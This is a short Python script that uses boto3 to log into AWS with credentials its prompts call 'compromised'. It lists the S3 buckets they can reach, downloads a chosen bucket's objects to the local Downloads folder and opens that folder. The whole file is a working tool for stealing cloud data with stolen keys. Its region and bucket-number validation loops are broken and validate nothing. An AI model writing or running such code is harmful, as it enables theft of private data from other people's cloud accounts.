import os, subprocess
from boto3.session import Session

def connect_to_aws():
    global session

    access_key = input("Copy and paste the compromised AWS access key ID here: ")
    secret_key = input("Copy and paste the compromised AWS secret access key here: ")
    region = input("Enter a region here: ")

    while True:
        try:
            aws_regions = [
                'ap-east-1', 'ap-northeast-1', 'ap-northeast-2', 'ap-south-1', 'ap-southeast-1', 'ap-southeast-2', 'ca-central-1', 
                'cn-north-1', 'cn-northwest-1', 'eu-central-1', 'eu-north-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 
                'sa-east-1', 'us-east-1', 'us-east-2', 'us-gov-east-1', 'us-gov-west-1', 'us-west-1', 'us-west-2'
            ]
            region in aws_regions
            break
        except ValueError:
            print("Enter a valid AWS region.")

    session = Session(
        aws_access_key_id='{}'.format(access_key),
        aws_secret_access_key='{}'.format(secret_key),
        region_name='{}'.format(region)
    )

def select_s3_bucket():
    global s3_client, selected_bucket

    s3_client = session.client('s3')
    s3_buckets = s3_client.list_buckets()['Buckets']

    for i in range(len(s3_buckets)):
        print('{0}. {1}'.format(i + 1, s3_buckets[i]['Name']))
    
    bucket_num = input('Enter the list number of the S3 bucket to download from: ')

    while True:
        try:
            bucket_num = int(bucket_num)
            break
        except ValueError:
            print("This is not a number.")
        try:
            bucket_num <= len(s3_buckets)
            break
        except ValueError:
            print("The number must be less than or equal to the number of S3 buckets.")
    
    selected_bucket = s3_buckets[bucket_num - 1]['Name']

def download_s3_bucket():
    global bucket_folder

    me = os.getlogin()
    bucket_folder = 'C:\\Users\\{0}\\Downloads\\{1}'.format(me, selected_bucket)

    os.mkdir(bucket_folder, 0o777)

    s3_objects = s3_client.list_objects(Bucket = '{}'.format(selected_bucket))['Contents']

    # Loop through objects in the selected S3 bucket.
    for i in range(len(s3_objects)):
        key_name = s3_objects[i]['Key']

        # Skip past the object if it is a directory.
        if key_name[-1] == '/':
            continue

        nested_dir = '\\'.join(key_name.split('/')[:-1])

        # If the local nested directory already exists, don't remake it.
        if bool(os.path.isdir('{0}\\{1}'.format(bucket_folder, nested_dir))):
            pass
        else:
            os.makedirs('{0}\\{1}'.format(bucket_folder, nested_dir), 0o777)

        s3_client.download_file(
            '{}'.format(selected_bucket),
            '{}'.format(key_name),
            '{0}\\{1}\\{2}'.format(bucket_folder, nested_dir, key_name.split('/')[-1])
        )

def open_folder_that_contains_s3_bucket():
    subprocess.call('explorer {}'.format(bucket_folder))

if __name__ == "__main__":
    connect_to_aws()
    select_s3_bucket()
    download_s3_bucket()
    open_folder_that_contains_s3_bucket()
